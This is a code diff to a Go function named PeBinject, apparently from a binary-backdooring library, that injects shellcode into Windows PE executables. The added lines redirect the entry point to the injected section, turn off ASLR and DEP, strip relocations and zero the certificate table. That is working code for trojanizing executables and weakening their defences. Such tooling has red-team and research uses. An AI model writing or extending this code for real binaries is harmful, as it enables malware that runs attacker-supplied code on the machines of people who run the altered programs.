@@ -4,10 +4,15 @@ import (
 	"bytes"
 	"encoding/binary"
 	"math/rand"
+	"time"
 
 	"github.com/Binject/debug/pe"
 	"github.com/Binject/shellcode/api"
 )
+
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
 
 // PeBinject - Inject shellcode into an PE binary
 func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) {
@@ -100,9 +105,23 @@ func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig)
 		hdr.DataDirectory[4].Size = 0
 		break
 	case *pe.OptionalHeader64:
-		hdr.SizeOfImage = newsection.VirtualAddress + newsection.VirtualSize
+		v := newsection.VirtualSize
+		if v == 0 {
+			v = newsection.Size // SizeOfRawData
+		}
+		hdr.SizeOfImage = align(v, sectionAlignment, newsection.VirtualAddress)
 		hdr.AddressOfEntryPoint = newsection.VirtualAddress
 		hdr.CheckSum = 0
+		// disable ASLR
+		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
+		hdr.DataDirectory[5].VirtualAddress = 0
+		hdr.DataDirectory[5].Size = 0
+		peFile.FileHeader.Characteristics |= pe.IMAGE_FILE_RELOCS_STRIPPED
+		//disable DEP
+		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT
+		// zero out cert table offset and size
+		hdr.DataDirectory[4].VirtualAddress = 0
+		hdr.DataDirectory[4].Size = 0
 		break
 	}
 
